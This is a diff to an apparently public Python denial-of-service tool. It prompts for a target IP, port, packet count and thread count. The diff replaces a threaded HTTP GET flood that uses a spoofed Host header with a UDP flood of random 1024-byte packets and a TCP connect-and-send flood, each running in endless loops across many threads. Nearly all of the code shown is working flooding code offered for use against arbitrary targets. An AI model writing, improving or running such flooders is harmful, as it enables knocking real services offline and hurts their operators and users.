@@ -30,10 +30,11 @@ print("License: The source code of this tool is under the MIT License.")
 print("© 2022 Tommaso Bona")
 print("Website IP finder: www.site24x7.com/find-ip-address-of-web-site.html")
 print()
-ip = str(input("Target's IP:"))
-port = int(input("Port number (80 and 443 suggested): "))
-pack = int(input("Number of packets: "))
-thread = int(input("Number of threads: "))
+ip = str(input(" Target's IP:"))
+port = int(input(" Port:"))
+choice = str(input(" UDP(y/n):"))
+times = int(input(" Number of Packets:"))
+threads = int(input(" Threads:"))
 time.sleep(2)
 os.system("clear")
 print("\033[91m")
@@ -50,15 +51,36 @@ print("[===============     ] 75%")
 time.sleep(2)
 print("[====================] 100%")
 time.sleep(1)
-attack_num = 0
-
-def attack():
-    while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        s.close()
-for i in range(500):
-    thread = threading.Thread(target=attack)
-    thread.start()
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Sent!!!")
+		except:
+			print("[!] Error!!!")
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
